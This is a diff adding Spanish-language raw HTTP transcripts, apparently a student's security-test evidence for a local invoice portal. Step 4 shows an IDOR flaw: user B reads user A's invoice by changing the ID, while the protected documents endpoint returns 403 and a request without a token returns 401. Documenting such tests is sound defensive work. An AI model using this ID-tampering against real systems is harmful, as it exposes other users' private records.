@@ -1,0 +1,135 @@
+TRANSCRIPTS HTTP CRUDOS — Evidencia P01 Integrante 1
+App: Portal de Facturas UAO — http://127.0.0.1:8008
+Token enmascarado por seguridad. Datos 100% de ejecución real.
+========================================================================
+
+>>> PASO 1: Autenticación del Usuario B (bob)
+
+### PETICIÓN
+POST /api/login HTTP/1.1
+Host: 127.0.0.1:8008
+Content-Type: application/json
+
+{"username": "bob", "password": "***"}
+
+### RESPUESTA
+HTTP/1.1 200
+{
+  "token": "<TOKEN-ENMASCARADO-48-hex>",
+  "user_id": 2,
+  "nombre": "Benito Probador (Usuario B)"
+}
+
+========================================================================
+
+>>> PASO 2: B consulta SU factura (2001) — LEGÍTIMO, 200
+
+### PETICIÓN
+GET /api/invoices/2001 HTTP/1.1
+Host: 127.0.0.1:8008
+Authorization: Bearer 44ee…<44 ocultos>
+
+### RESPUESTA
+HTTP/1.1 200
+{
+  "id": 2001,
+  "numero": "FAC-B-2001",
+  "concepto": "Auditoría interna de accesos",
+  "monto": 310000.0,
+  "fecha": "2026-04-20",
+  "propietario_user_id": 2
+}
+
+========================================================================
+
+>>> PASO 3: B lista SOLO sus facturas (endpoint acotado)
+
+### PETICIÓN
+GET /api/invoices HTTP/1.1
+Host: 127.0.0.1:8008
+Authorization: Bearer 44ee…<44 ocultos>
+
+### RESPUESTA
+HTTP/1.1 200
+{
+  "invoices": [
+    {
+      "id": 2001,
+      "numero": "FAC-B-2001",
+      "concepto": "Auditoría interna de accesos",
+      "monto": 310000.0,
+      "fecha": "2026-04-20"
+    }
+  ]
+}
+
+========================================================================
+
+>>> PASO 4: B consulta factura AJENA de A (1001) — DEBERÍA 403, es 200 (IDOR)
+
+### PETICIÓN
+GET /api/invoices/1001 HTTP/1.1
+Host: 127.0.0.1:8008
+Authorization: Bearer 44ee…<44 ocultos>
+
+### RESPUESTA
+HTTP/1.1 200
+{
+  "id": 1001,
+  "numero": "FAC-A-1001",
+  "concepto": "Servicios de consultoría",
+  "monto": 1520000.0,
+  "fecha": "2026-01-15",
+  "propietario_user_id": 1
+}
+
+========================================================================
+
+>>> PASO 5: B consulta SU documento (5002) — LEGÍTIMO, 200
+
+### PETICIÓN
+GET /api/documents/5002 HTTP/1.1
+Host: 127.0.0.1:8008
+Authorization: Bearer 44ee…<44 ocultos>
+
+### RESPUESTA
+HTTP/1.1 200
+{
+  "id": 5002,
+  "titulo": "Acta interna B",
+  "contenido": "Notas internas del Usuario B.",
+  "fecha": "2026-04-18",
+  "propietario_user_id": 2
+}
+
+========================================================================
+
+>>> PASO 6: B consulta documento AJENO de A (5001) — endpoint PROTEGIDO, 403 sin datos
+
+### PETICIÓN
+GET /api/documents/5001 HTTP/1.1
+Host: 127.0.0.1:8008
+Authorization: Bearer 44ee…<44 ocultos>
+
+### RESPUESTA
+HTTP/1.1 403
+{
+  "error": "No autorizado"
+}
+
+========================================================================
+
+>>> PASO 7: control negativo — sin token (401)
+
+### PETICIÓN
+GET /api/invoices/1001 HTTP/1.1
+Host: 127.0.0.1:8008
+
+### RESPUESTA
+HTTP/1.1 401
+{
+  "error": "No autenticado"
+}
+
+========================================================================
+
